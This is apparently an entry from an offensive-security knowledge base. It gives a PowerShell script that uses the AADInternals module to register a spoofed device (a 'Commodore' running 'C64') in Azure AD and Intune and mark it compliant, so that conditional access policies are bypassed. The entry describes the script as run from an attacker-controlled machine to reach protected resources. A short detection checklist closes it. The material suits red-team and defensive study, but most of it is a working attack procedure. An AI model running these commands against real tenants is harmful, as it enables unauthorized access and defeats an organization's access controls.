---
id: 18f24bcf-d43d-4261-8d62-03ea540a7921
name: aad-internals-fake-device-compliance-script
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:15.982399+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - azure
  - aad
  - intune
  - bypass
  - script
validated: true
---

# aad-internals-fake-device-compliance-script

## Code

```powershell
# AAD Internals - Making your device compliant
# Get an access token for AAD join and save to cache
Get-AADIntAccessTokenForAADJoin -SaveToCache
# Join the device to Azure AD
Join-AADIntDeviceToAzureAD -DeviceName "SixByFour" -DeviceType "Commodore" -OSVersion "C64"
# Marking device compliant - option 1: Registering device to Intune
# Get an access token for Intune MDM and save to cache (prompts for credentials)
Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache 
# Join the device to Intune
Join-AADIntDeviceToIntune -DeviceName "SixByFour"
# Start the call back
Start-AADIntDeviceIntuneCallback -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName "SixByFour"
```

## Description

This PowerShell script uses the AADInternals module to automate the process of faking device compliance in Azure AD and Intune, bypassing conditional access policies by simulating a compliant device join and enrollment.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| DeviceName | Name of the fake device | SixByFour |
| DeviceType | Spoofed device type | Commodore |
| OSVersion | Spoofed OS version | C64 |
| PfxFileName | Path to authentication certificate | .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx |
| PfxFileName (MDM) | Path to MDM callback certificate | .\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx |

## Usage

Execute this script in a PowerShell session after installing AADInternals. Update placeholders for device details and certificate paths. It is typically run from an attacker-controlled machine with Azure credentials to create a fake compliant device for accessing protected resources.

## Detection

- Monitor Azure AD sign-in logs for unusual device registrations with mismatched OS types.
- Audit Intune enrollment events for scripted or bulk joins.
- Enable PowerShell logging to capture AADInternals module usage.
- Check for anomalous certificate-based authentications in MDM logs.

## Related

- [[procedures/Bypass-Azure-Conditional-Access-via-Fake-Device-Join]]
- [[tools/AADInternals]]
